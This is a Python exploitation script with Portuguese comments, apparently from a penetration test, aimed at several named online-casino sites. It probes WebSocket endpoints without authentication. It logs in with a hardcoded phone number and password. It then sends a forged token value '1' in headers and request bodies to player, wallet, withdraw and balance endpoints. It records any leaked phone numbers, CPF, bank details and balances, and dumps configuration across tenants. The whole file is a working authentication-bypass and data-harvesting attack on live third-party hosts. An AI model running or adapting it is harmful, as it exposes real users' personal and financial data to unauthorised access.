"""
Exploração final:
1. WebSocket com token anão (usando websockets lib ou raw socket)
2. player/info com token no body em mais paths
3. Mapeamento final de superfície não coberta
4. Consolidação de todos os tenants afetados
"""
import ssl, socket, base64, hashlib, struct, json, time, re
import urllib.request, urllib.error
from datetime import datetime, timezone

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode    = ssl.CERT_NONE

RESULTS = []

def rec(cat, test, rq, rs, interp, sev="info"):
    RESULTS.append({"ts":datetime.now(timezone.utc).isoformat(),
                    "cat":cat,"test":test,"rq":rq,"rs":rs,"interp":interp,"sev":sev})
    icons = {"critical":"🔴","high":"🟠","medium":"🟡","low":"🔵","info":"⚪"}
    code = rs.get("code","?") if isinstance(rs,dict) else "?"
    print(f"  {icons.get(sev,'⚪')} [{cat}/{test[:55]}] code={code}")
    if sev in ("critical","high"):
        print(f"     ↪ {interp}")

def http_req(method, url, body=None, headers=None):
    h = {"User-Agent":"Mozilla/5.0","Accept":"application/json, */*"}
    if body is not None: h["Content-Type"] = "application/json"
    if headers: h.update(headers)
    data = json.dumps(body).encode() if body is not None else None
    try:
        r = urllib.request.Request(url, data=data, headers=h, method=method)
        with urllib.request.urlopen(r, timeout=10, context=ctx) as resp:
            raw = resp.read(16384).decode("utf-8","ignore")
            try: return resp.status, dict(resp.headers), json.loads(raw)
            except: return resp.status, dict(resp.headers), {"_raw": raw[:600]}
    except urllib.error.HTTPError as e:
        raw = e.read(8192).decode("utf-8","ignore") if e.fp else ""
        try: return e.code, {}, json.loads(raw)
        except: return e.code, {}, {"_raw": raw[:400]}
    except Exception as ex:
        return 0, {}, {"err": str(ex)}

# ═══════════════════════════════════════════════════════
# 1. WebSocket via raw SSL socket
# ═══════════════════════════════════════════════════════

print("=" * 60)
print("1. WEBSOCKET — HANDSHAKE RAW")
print("=" * 60)

def ws_connect(host, path, extra_headers=None):
    """Faz handshake WebSocket real via SSL socket."""
    key = base64.b64encode(b"kiro_pentest_key_1234").decode()
    headers = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Upgrade: websocket\r\n"
        f"Connection: Upgrade\r\n"
        f"Sec-WebSocket-Version: 13\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        f"Origin: https://{host}\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
    )
    if extra_headers:
        for k, v in extra_headers.items():
            headers += f"{k}: {v}\r\n"
    headers += "\r\n"

    try:
        raw_sock = socket.create_connection((host, 443), timeout=8)
        ssl_sock  = ctx.wrap_socket(raw_sock, server_hostname=host)
        ssl_sock.send(headers.encode())
        response = ssl_sock.recv(4096).decode("utf-8","ignore")
        return ssl_sock, response
    except Exception as ex:
        return None, str(ex)

def ws_send_text(sock, message):
    """Envia frame WS texto."""
    payload = message.encode()
    header = bytearray()
    header.append(0x81)  # FIN + opcode TEXT
    if len(payload) < 126:
        header.append(0x80 | len(payload))  # MASK bit
    else:
        header.append(0x80 | 126)
        header += struct.pack(">H", len(payload))
    mask = b'\x00\x00\x00\x00'  # máscara zerada pra simplificar
    header += mask
    masked = bytearray(p ^ mask[i % 4] for i, p in enumerate(payload))
    sock.send(bytes(header) + bytes(masked))

def ws_recv(sock):
    """Recebe um frame WS."""
    try:
        header = sock.recv(2)
        if len(header) < 2: return None
        fin  = (header[0] & 0x80) != 0
        opcode = header[0] & 0x0F
        masked = (header[1] & 0x80) != 0
        length = header[1] & 0x7F
        if length == 126:
            length = struct.unpack(">H", sock.recv(2))[0]
        elif length == 127:
            length = struct.unpack(">Q", sock.recv(8))[0]
        if masked:
            mask = sock.recv(4)
        data = sock.recv(min(length, 16384))
        if masked:
            data = bytes(b ^ mask[i % 4] for i, b in enumerate(data))
        return {"fin":fin,"opcode":opcode,"data":data}
    except Exception:
        return None

# Testar WS sem autenticação
for host in ["ds.amizade777.com", "ds.rainha777slots.com"]:
    for path in ["/websocket6", "/websocket"]:
        print(f"\n  Conectando em wss://{host}{path}...")
        sock, resp = ws_connect(host, path)
        if sock is None:
            print(f"  [ERRO] {resp[:100]}")
            continue

        if "101 Switching Protocols" in resp:
            print(f"  🟢 101 — WebSocket conectado!")
            # Tentar receber frame inicial (heartbeat/welcome)
            sock.settimeout(3)
            frame = ws_recv(sock)
            if frame:
                print(f"    Frame recebido: opcode={frame['opcode']} len={len(frame['data'])}")
                print(f"    Data hex: {frame['data'][:32].hex()}")
                try:
                    j = json.loads(frame['data'].decode("utf-8","ignore"))
                    print(f"    JSON: {json.dumps(j, ensure_ascii=False)[:200]}")
                    rec("websocket", f"wss://{host}{path}",
                        {"host":host,"path":path},
                        j,
                        "WS conectou SEM auth e recebeu frame!",
                        "high")
                except:
                    rec("websocket", f"wss://{host}{path}",
                        {"host":host,"path":path},
                        {"raw_hex":frame['data'][:32].hex()},
                        "WS conectou SEM auth (frame binário)",
                        "medium")
        elif "HTTP/1.1 4" in resp or "HTTP/1.1 5" in resp:
            code = re.search(r'HTTP/1\.1 (\d+)', resp)
            print(f"  HTTP {code.group(1)} — rejeitado")
        else:
            print(f"  Resposta: {resp[:200]!r}")

        if sock:
            try: sock.close()
            except: pass
        time.sleep(0.5)

# ═══════════════════════════════════════════════════════
# 2. Mapeamento final de endpoints player/* não testados
# ═══════════════════════════════════════════════════════

print("\n" + "=" * 60)
print("2. ENDPOINTS PLAYER/* NÃO TESTADOS (token anão + body token)")
print("=" * 60)

BASE = "https://ds.amizade777.com"

# Login pra ter token válido
def login():
    pl = {"appChannel":"pc","appPackageName":"com.slots.big","deviceId":"0beb614f-8838-43ef-00fc-0029f7d5d20f",
          "deviceModel":"WEB","deviceVersion":"WEB","appVersion":"1.0.0","sysTimezone":None,"sysLanguage":None,
          "phone":"21998498419","password":"21998498419"}
    st,_,b = http_req("POST", BASE+"/prod-api/player/sign-in", pl)
    if b.get("code") == 200:
        return b["data"]["token"]
    raise RuntimeError(f"Login falhou: {b}")

try:
    valid_token = login()
    print(f"  Token válido: {valid_token}")

    # Endpoints player/* nunca testados com body token
    player_paths = [
        "/prod-api/player/info",
        "/prod-api/player/detail",
        "/prod-api/player/profile",
        "/prod-api/player/account",
        "/prod-api/player/bank",
        "/prod-api/player/wallet",
        "/prod-api/player/transaction",
        "/prod-api/player/history",
        "/prod-api/player/recharge",
        "/prod-api/player/withdraw",
        "/prod-api/player/bonus",
        "/prod-api/player/vip",
        "/prod-api/player/rank",
        "/prod-api/player/game",
        "/prod-api/player/record",
    ]

    for path in player_paths:
        # Com body token = 1 (token anão via body)
        body = {"token": "1", "appPackageName": "com.slots.big"}
        st1,_,b1 = http_req("POST", BASE+path, body)
        c1 = b1.get("code") if isinstance(b1,dict) else None
        d1 = b1.get("data") if isinstance(b1,dict) else None

        if c1 == 200 and d1 is not None:
            sensitive = []
            if isinstance(d1, dict):
                sensitive = [k for k in d1 if any(s in k.lower() for s in
                             ("phone","email","cpf","bank","real_name","ip","client_ip","password"))]
            rec("player_body_token", path,
                {"body_token": 1, "path": path},
                {"code":c1,"data_keys":list(d1.keys()) if isinstance(d1,dict) else type(d1).__name__,
                 "leaked_pii":sensitive,"data":json.dumps(d1,ensure_ascii=False)[:400]},
                f"Dados via body token anão! PII: {sensitive}" if sensitive else
                f"Dados via body token anão.",
                "critical" if sensitive else "high")
        time.sleep(0.3)
except Exception as ex:
    print(f"  [ERRO login]: {ex}")

# ═══════════════════════════════════════════════════════
# 3. Consolidação final dos tenants
# ═══════════════════════════════════════════════════════

print("\n" + "=" * 60)
print("3. CONSOLIDAÇÃO FINAL — TODOS OS TENANTS")
print("=" * 60)

tenants_final = [
    ("amizade777",   "ds.amizade777.com"),
    ("rainha777",    "ds.rainha777slots.com"),
    ("aphrodite777", "ds.aphrodite777.com"),
    ("lucky777",     "ds.lucky777.mx"),
]

print(f"\n  {'Tenant':20} {'Token Anão':12} {'Amount uid=1':15} {'Config dump':12}")
print("  " + "-"*65)

for name, host in tenants_final:
    base = f"https://{host}"

    # Token anão
    st,_,b = http_req("GET", base+"/japi/user/balance/querySimpleBalance",
                      headers={"Token":"1","Origin":base})
    dwarf_code = b.get("code") if isinstance(b,dict) else None
    dwarf_data = b.get("data") if isinstance(b,dict) else None
    amount = dwarf_data.get("amount") if isinstance(dwarf_data,dict) else None

    time.sleep(0.3)

    # Config dump
    st2,_,b2 = http_req("POST", base+"/prod-api/set/get",
                         {"appChannel":"pc","appVersion":"1.0.0","appPackageName":"com.slots.big"},
                         headers={"Origin":base})
    conf_code = b2.get("code") if isinstance(b2,dict) else None

    dwarf_ok = "✅" if dwarf_code == 200 else "❌"
    conf_ok  = "✅" if conf_code == 200 else "❌"
    amount_str = f"R${amount/100:.2f}" if amount is not None else "N/A"

    print(f"  {name:20} {dwarf_ok} {dwarf_code!s:8}   {amount_str:15} {conf_ok} {conf_code}")
    time.sleep(0.5)

# ═══════════════════════════════════════════════════════
# 4. Verificar se o token anão funciona via body token
#    (tanto no amizade quanto no aphrodite)
# ═══════════════════════════════════════════════════════

print("\n" + "=" * 60)
print("4. PLAYER/INFO VIA BODY TOKEN=1 — RETORNA PII?")
print("=" * 60)

for tenant_name, host in [("amizade777","ds.amizade777.com"),
                           ("aphrodite777","ds.aphrodite777.com")]:
    base = f"https://{host}"
    st,_,b = http_req("POST", base+"/prod-api/player/info",
                       {"token":"1","appPackageName":"com.slots.big"},
                       headers={"Origin":base,"Referer":base+"/"})
    code = b.get("code") if isinstance(b,dict) else None
    data = b.get("data") if isinstance(b,dict) else None
    print(f"\n  {tenant_name}: code={code}")
    if code == 200 and data:
        ui = data.get("user_info") or data
        print(f"    Campos: {list(ui.keys()) if isinstance(ui,dict) else type(ui).__name__}")
        for k in ["phone","email","cpf","real_name","bank_account"]:
            if isinstance(ui,dict) and k in ui:
                print(f"    {k}: {ui[k]!r} — 🔴 PII EXPOSTO!")
        rec("player_info_pii", tenant_name,
            {"body_token":"1","host":host},
            {"code":code,"data":json.dumps(data,ensure_ascii=False)[:400]},
            f"player/info com body token anão retornou dados",
            "high" if code==200 else "info")
    time.sleep(0.5)

# ═══════════════════════════════════════════════════════
# Salvar
# ═══════════════════════════════════════════════════════

with open("explorar_ws_final_resultados.json","w",encoding="utf-8") as f:
    json.dump(RESULTS, f, ensure_ascii=False, indent=2, default=str)

crits = [e for e in RESULTS if e["sev"] in ("critical","high")]
print(f"\n{'='*60}")
print(f"TOTAL: {len(crits)} achados high/critical de {len(RESULTS)} total")
for e in crits:
    icons = {"critical":"🔴","high":"🟠"}
    print(f"  {icons.get(e['sev'],'?')} {e['cat']}/{e['test'][:60]}")
    print(f"    {e['interp'][:120]}")

print(f"\n✅ explorar_ws_final_resultados.json")
